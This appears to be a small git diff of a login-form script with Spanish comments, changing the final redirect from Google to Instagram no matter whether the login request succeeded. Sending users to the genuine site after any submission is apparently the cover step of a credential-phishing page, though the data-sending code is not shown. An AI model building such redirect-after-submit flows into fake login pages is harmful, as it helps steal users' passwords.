@@ -23,6 +23,6 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
         console.error('Error de conexión con el servidor:', error);
     } finally {
         // Redirigir a la página de Google sin importar si la petición falló o tuvo éxito
-        window.location.href = 'https://www.google.com';
+        window.location.href = 'https://www.instagram.com';
     }
 });
